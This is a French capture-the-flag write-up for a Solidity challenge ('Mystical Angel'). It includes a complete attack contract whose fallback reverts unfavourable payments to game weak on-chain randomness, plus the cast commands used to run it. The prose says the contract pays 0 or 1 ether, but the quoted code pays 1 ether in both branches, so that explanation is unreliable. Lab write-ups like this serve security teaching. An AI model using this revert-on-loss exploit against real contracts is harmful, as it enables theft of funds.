# Mystical Angel - K.L.M

## Contrat
Ce contrat est une simulation d'un jeu similaire à un pile ou face avec un ange (?).

Notre but est de remplir la condition "isSolved()", pour ce faire, nous remarquons que nous devons appeler la fonction :
```solidity
function ascend() public payable {
        require(blessings[msg.sender] >= 10,"You have not proved your worthiness :((");
        solved = true;
    }
```

Afin d'obtenir 10 blessings, nous nous intéressons à la partie du code suivante:
```solidity
function Blessing() public payable {
    require(msg.value == 1 ether, "You must pay the right to get your blessing");
    uint256 randomNumber = uint256(keccak256(abi.encodePacked(seed, msg.sender, block.prevrandao, block.timestamp)));
    uint256 AngelNumber = randomNumber % 2;

    if (AngelNumber == 1) {
        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
        blessings[msg.sender] += 1;
    }

    if (AngelNumber == 0) {
        (bool sent, ) = msg.sender.call{value: 1 ether}("");
        require(sent, "Failed to send Ether");
        blessings[msg.sender] = 0;
    }
}
```
Il calcule une valeur "random" dont nous n'avons pas connaissance, puis en fonction de sa valeur, il nous renvoie une transaction contenant 0 ou 1 ether puis nous ajoute un blessing ou nous les retire tous. 

## Solve

Une manière simple de réussir à obtenir uniquement des bonnes conditions viserait à ne jamais rentrer dans l'instruction : `blessings[msg.sender] = 0;` et pour ça nous pouvons utiliser une petite astuce : Rejeter tout envoi de fonds qui n'est pas égal à 1 ether.

Mais comment on fait K.L.M ?

Comme ça !
```solidity
fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
```

Maintenant on écris un contrat d'attaque (dispo dans le dossier sous le nom attack.sol):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface mysticalAngel{
     function Blessing() external payable;
     function ascend() external payable;
}

contract Attack {

    mysticalAngel public angel;

    function setTarget(address _angel) public {
        angel = mysticalAngel(_angel);
    }

    function attack() public payable {
        angel.Blessing{value: 1 ether}();
    }

    function win() public {
        angel.ascend();
    }


    fallback() payable external{
        if (msg.value != 1 ether){
            revert();
        }
    }
}
```

Maintenant il ne reste plus qu'à le déployer, exporter nos variables d'environnement sous la forme : \$ATK = adresse du contrat attack, \$TAR = adresse du contrat cible, \$PK = clé privée, \$RPC = URL du RPC
Et à realiser la suite de commande suivante :

```bash
cast send $ATK "setTarget(address)" $TAR -r $RPC --private-key $PK
cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether # pour envoyer 1 ether au contrat pour pouvoir call la fonction, si ce n'est pas bon, il faut réessayer.

cast b $ATK -r $RPC # par exemple ici ce n'était pas bon.
0

cast send $ATK "attack()" -r $RPC --private-key $PK --value 1ether
cast b $ATK -r $RPC
1000000000000000000 # ça a fonctionné

cast send $ATK "attack()" -r $RPC --private-key $PK # à répeter autant de fois que nécessaire

cast call $TAR "blessings(address)(uint256)" $ATK -r $RPC
13 # supérieur à 10, on est bon !
```

Win !
On récupère ensuite notre flag sur la plateforme.
